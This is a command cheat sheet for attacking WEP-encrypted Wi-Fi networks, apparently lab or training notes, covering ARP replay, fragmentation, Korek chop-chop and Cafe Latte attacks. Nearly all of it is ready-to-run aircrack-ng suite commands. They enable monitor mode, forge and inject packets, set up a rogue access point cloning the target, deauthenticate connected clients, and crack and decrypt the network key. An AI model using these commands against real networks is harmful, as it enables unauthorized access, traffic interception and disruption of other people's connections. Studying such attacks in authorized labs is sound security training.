title: Wired Equivalent Privacy (WEP) Attacks
html:
Wired Equivalent Privacy (WEP) Attacks

ARP Request Replay Attack

Enable monitor mode.

`sudo airmon-ng start wlan0`<br>

Configure wireless interfaces / confirm monitor mode is enabled.

iwconfig

Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file.

sudo airodump-ng wlan0mon -c 1 -w WEP

Launch ARP Request Replay attack.

sudo aireplay-ng -3 -b <AP_MAC> -h <Station_MAC> wlan0mon

Crack the WEP key using the PTW statistical attack.

sudo aircrack-ng -b <AP_MAC> WEP-01.cap

Fragmentation Attack

Enable monitor mode.

sudo airmon-ng start wlan0

Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file.

sudo airodump-ng wlan0mon -c 1 -w WEP

Initiate the fragmentation attak

sudo aireplay-ng -5 -b <AP_MAC> -h <station_MAC> wlan0mon

Identify the source and destination IP addresses

sudo tcpdump -s 0 -n -e -r replay_scr-0805-191842.cap

Forge an ARP request using the captured PRGA (.xor) bytes.

packetforge-ng -0 -a <AP_MAC> -h <Station_MAC> -k <AP_IP> -l <Station_IP> -y fragment-0805-191851.xor -w forgedarp.cap

Inject the forged packet using interactive packet replay.

sudo aireplay-ng -2 -r forgedarp.cap -h <Source_MAC> wlan0mon

Launch ARP Request Replay attack (to accelerate IV generation.)

sudo aireplay-ng -3 -b <AP_MAC> -h <Station_MAC> wlan0mon

Crack the WEP key using the PTW statistical attack.

sudo aircrack-ng -b <AP_MAC> WEP-01.cap

Korek Chop Chop Attack

Start the Korek Chop Chop attack.

`sudo aireplay-ng -4 -b <AP_MAC> -h <Station_MAC> wlan0mon`<br>

Identify the source and destination IP addresses.

sudo tcpdump -s 0 -n -e -r replay_dec-0805-221220.cap

Forge an ARP request using the captured PRGA (.xor) bytes.

packetforge-ng -0 -a <AP_MAC> -h <Station_MAC> -k <AP_IP> -l <Station_IP> -y fragment-0805-191851.xor -w forgedarp.cap

Inject the forged packet using interactive packet replay.

sudo aireplay-ng -2 -r forgedarp.cap -h <Source_MAC> wlan0mon

Launch ARP Request Replay attack (to accelerate IV generation.)

sudo aireplay-ng -3 -b <AP_MAC> -h <Station_MAC> wlan0mon

Crack the WEP key using the PTW statistical attack.

sudo aircrack-ng -b <AP_MAC> WEP-01.cap

The Cafe Latte Attack

Start the Cafe Latte attack.

`sudo aireplay-ng -6 -D -b <AP_MAC> -h <Station_MAC> wlan0mon`<br>

Launch fake access point. Our rogue AP should have identical ESSID/BSSID as the target AP.

sudo airbase-ng -c 1 -a <AP_BSSID>  -e "<AP_ESSID>" wlan0mon -W 1 -L

De-authenticate a connected station.

sudo aireplay-ng -0 10 -a <AP_MAC> -c <Station_MAC>  wlan0mon

Crack the WEP key using the PTW statistical attack.

sudo aircrack-ng -b <AP_MAC> WEP-01.cap

Additional WEP Cracking

Benchmark CPU performance.

aircrack-ng -S

Capture only initialization vectors.

sudo airodump-ng wlan0mon -c 1 -w HTB --ivs

Crack the WEP key using the Korek method.

aircrack-ng -K HTB.ivs

Decrypt a WEP-encrypted capture file.

airdecap-ng -w <hex_key> WEP-01.cap
